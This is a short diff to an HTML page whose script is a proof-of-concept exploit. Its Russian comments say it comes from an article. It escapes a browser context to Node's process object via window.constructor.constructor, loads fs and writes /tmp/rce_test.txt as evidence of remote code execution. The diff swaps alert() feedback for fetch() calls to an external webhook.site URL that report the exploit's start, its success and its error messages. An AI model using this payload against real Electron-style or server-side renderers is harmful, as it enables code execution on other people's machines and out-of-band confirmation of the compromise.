@@ -2,16 +2,17 @@
 <html>
 <body>
 <script>
-// Эксплойт из статьи — пытаемся получить доступ к process через страницу
+// Отправка сигнала о запуске
+fetch('https://webhook.site/4369f85e-8b9b-4f2e-a358-7f85257470c7?msg=Exploit+started');
+
 async function exploit() {
   try {
-    // Пытаемся получить доступ к process через прототип
     const processObj = window.constructor.constructor('return process')();
     const fs = processObj.mainModule.require('fs');
-    const result = fs.writeFileSync('/tmp/rce_test.txt', 'RCE via SSRF!', 'utf8');
-    alert('File written: /tmp/rce_test.txt');
+    fs.writeFileSync('/tmp/rce_test.txt', 'RCE via SSRF!', 'utf8');
+    fetch('https://webhook.site/4369f85e-8b9b-4f2e-a358-7f85257470c7?msg=File+written');
   } catch(e) {
-    alert('Exploit failed: ' + e);
+    fetch('https://webhook.site/4369f85e-8b9b-4f2e-a358-7f85257470c7?msg=Error:' + e.message);
   }
 }
 exploit();
